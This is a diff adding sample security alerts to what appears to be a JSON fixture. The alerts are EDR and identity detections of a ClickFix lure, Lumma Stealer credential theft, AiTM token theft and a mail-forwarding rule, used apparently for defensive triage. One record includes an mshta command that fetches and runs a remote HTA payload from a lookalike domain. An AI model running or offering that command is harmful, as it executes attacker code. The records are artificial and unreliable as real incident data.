@@ -234,5 +234,73 @@
       "cmdline": "TachyonAgent.exe --inventory",
       "tactic": "Discovery"
     }
+  },
+  {
+    "source": "crowdstrike_edr",
+    "client": "Sterling Retail",
+    "raw": {
+      "detection_id": "ldt:clk900",
+      "created_timestamp": "2026-08-14T11:30:00Z",
+      "name": "ClickFix: fake human-verification lure executed",
+      "severity": "high",
+      "hostname": "STL-WKS-17",
+      "user_name": "d.rao",
+      "description": "User was shown a fake 'verify you are human' page and tricked into pasting a command into the Windows Run dialog. mshta then fetched a remote payload — classic ClickFix social engineering.",
+      "domain": "cloudflare-verify.lol",
+      "url_host": "cloudflare-verify.lol",
+      "cmdline": "mshta.exe https://cloudflare-verify.lol/verify.hta",
+      "tactic": "Execution",
+      "technique": "User Execution: Malicious Copy and Paste"
+    }
+  },
+  {
+    "source": "crowdstrike_edr",
+    "client": "Sterling Retail",
+    "raw": {
+      "detection_id": "ldt:clk901",
+      "created_timestamp": "2026-08-14T11:33:00Z",
+      "name": "Infostealer execution (Lumma Stealer)",
+      "severity": "high",
+      "hostname": "STL-WKS-17",
+      "user_name": "d.rao",
+      "description": "Payload dropped by the ClickFix lure began credential theft — harvesting browser-stored passwords, cookies and session tokens.",
+      "sha256": "b6d91f4c2e7a8035cc1aa9f0e2d4b7619a3c5f82d0e1b4a6c7f9028d3e5a1b4c",
+      "filename": "verify.exe",
+      "tactic": "Credential Access",
+      "technique": "Credentials from Password Stores"
+    }
+  },
+  {
+    "source": "entra_id",
+    "client": "Harbor Health",
+    "raw": {
+      "id": "signin-840",
+      "createdDateTime": "2026-08-14T12:05:00Z",
+      "riskEventType": "Token theft via AiTM phishing",
+      "riskLevel": "high",
+      "userPrincipalName": "a.menon@harborhealth.org",
+      "ipAddress": "104.21.9.130",
+      "riskDetail": "Session token replayed from a new ASN minutes after the user clicked a phishing link; consistent with adversary-in-the-middle credential and token theft.",
+      "location": "Ashburn, US",
+      "riskState": "atRisk",
+      "clientAppUsed": "Browser",
+      "host_hint": "HBR-LAP-08"
+    }
+  },
+  {
+    "source": "entra_id",
+    "client": "Harbor Health",
+    "raw": {
+      "id": "signin-841",
+      "createdDateTime": "2026-08-14T12:11:00Z",
+      "riskEventType": "Suspicious inbox rule created",
+      "riskLevel": "medium",
+      "userPrincipalName": "a.menon@harborhealth.org",
+      "ipAddress": "104.21.9.130",
+      "riskDetail": "A new inbox rule auto-forwards all mail to an external address and deletes it — a classic business-email-compromise move after account takeover.",
+      "location": "Ashburn, US",
+      "riskState": "atRisk",
+      "clientAppUsed": "Exchange"
+    }
   }
 ]
